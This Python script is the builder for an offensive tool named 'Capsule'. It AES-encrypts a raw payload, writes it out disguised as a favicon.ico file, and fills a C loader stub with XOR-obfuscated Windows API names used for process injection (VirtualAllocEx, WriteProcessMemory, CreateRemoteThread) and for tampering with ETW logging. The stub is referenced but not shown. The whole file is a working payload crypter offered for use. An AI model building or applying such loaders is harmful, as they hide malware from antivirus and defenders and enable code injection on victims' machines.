from Crypto.Cipher import AES
import secrets
import hashlib
import sys
import os

aes_key = secrets.token_bytes(16)
xor_key = secrets.token_hex(16)

functions = ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "WaitForSingleObject", "CreateToolhelp32Snapshot", "Process32First", "Process32Next", "CloseHandle", "LoadLibraryA", "CryptDestroyKey", "CryptDestroyHash", "CryptReleaseContext", "CryptDecrypt", "CryptDeriveKey", "CryptHashData", "CryptCreateHash", "CryptAcquireContextW", "OpenProcess", "VirtualProtect", "CreateProcessA", "VirtualAlloc", "ReadProcessMemory", "TerminateProcess", "VirtualFree", "EtwEventWrite", "FlushInstructionCache", "VirtualProtectEx"]
names = ["advapi32.dll", "kernel32.dll", "ntdll.dll", "notepad.exe", "explorer.exe", "cmd.exe"]

def aes_pad(data):
    return data + (AES.block_size - len(data) % AES.block_size) * chr(AES.block_size - len(data) % AES.block_size).encode()

def aes_encrypt(padded, key):
    hashed_key = hashlib.sha256(key).digest()
    iv = 16 * b'\x00'
    cipher = AES.new(hashed_key, AES.MODE_CBC, iv)
    return cipher.encrypt(padded)

def return_aes_key(key):
    temp = []
    for i in range(0, len(key.hex()), 2):
        temp.append("0x" + key.hex()[i:i+2])
    return ("{ "+ f"{', '.join(temp)}" + " };")

def xor_encrypt(data, key):
    encrypted_data = ""
    i = 0
    for char in data:
        key_char = key[i%len(key)]
        encrypted_data += chr(ord(char) ^ ord(key_char))
        i += 1
    return encrypted_data

def format_c(ciphertext):
    return ('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')

def format_function(functionname):
    ciphertext = xor_encrypt(functionname+"\0", xor_key)
    return (f"{format_c(ciphertext)}")

print('''
      ::::::::      :::     :::::::::   ::::::::  :::    ::: :::        ::::::::::  
    :+:    :+:   :+: :+:   :+:    :+: :+:    :+: :+:    :+: :+:        :+:         
   +:+         +:+   +:+  +:+    +:+ +:+        +:+    +:+ +:+        +:+          
  +#+        +#++:++#++: +#++:++#+  +#++:++#++ +#+    +:+ +#+        +#++:++#      
 +#+        +#+     +#+ +#+               +#+ +#+    +#+ +#+        +#+            
#+#    #+# #+#     #+# #+#        #+#    #+# #+#    #+# #+#        #+#             
########  ###     ### ###         ########   ########  ########## ##########       

**************************** Created by CanOzSec ****************************
''')
path = os.getcwd() + "\\build"
os.mkdir(path)
try:
    plain_payload = open(sys.argv[1], "rb").read()
except:
    print(f"Specify payload to capsule: {sys.argv[0]} <raw payload file>")
    sys.exit()

print("[*] Encrypting payload...")
encrypted_payload = aes_encrypt(aes_pad(plain_payload), aes_key)
open("build/favicon.ico", "wb").write(encrypted_payload)
print("[*] Successfully encrypted payload.")

print("[*] Parsing and replacing stub...")
with open('src/stub.c', 'r') as stub:
	stub_data = stub.read()

xor_key_stub = f"\"{xor_key}\";"
stub_data = stub_data.replace("REPLACE_ME_AESKEY_STR", return_aes_key(aes_key))
stub_data = stub_data.replace("REPLACE_ME_XORKEY_STR", xor_key_stub)


for function in functions:
	replace_str = f"REPLACE_ME_{function.upper()}_STR"
	stub_data = stub_data.replace(replace_str, format_function(function))

for name in names:
	replace_name = (name.split(".")[0]).upper()
	stub_data = stub_data.replace(f"REPLACE_ME_{replace_name}_STR", format_function(name))

stub_data = stub_data.replace("REPLACE_ME_SYSTEM32PATH_STR", format_function("C:\\Windows\\System32\\"))
stub_data = stub_data.replace("REPLACE_ME_TEXT_STR", format_function(".text"))

with open('build/capsule.c', 'w') as build:
	build.write(stub_data)

print("[*] Successfully created capsule.")
print("[*] Copying headers and resources from src")
with open('src/resources.h', 'r') as resources_h:
	resources_h_data = resources_h.read()
with open('src/resources.rc', 'r') as resources_rc:
	resources_rc_data = resources_rc.read()
with open('build/resources.h', 'w') as resources_h_build:
	resources_h_build.write(resources_h_data)
with open('build/resources.rc', 'w') as resources_rc_build:
	resources_rc_build.write(resources_rc_data)
with open('src/compile.bat', 'r') as compile_bat:
	compile_bat_data = compile_bat.read()
with open('build/compile.bat', 'w') as compile_bat_build:
	compile_bat_build.write(compile_bat_data)
print("[*] Everything is ready to compile")
print("[?] You can compile them with x64 Native Tools Command prompt using compile.bat")
print("[:)] Thanks for using my tool.")
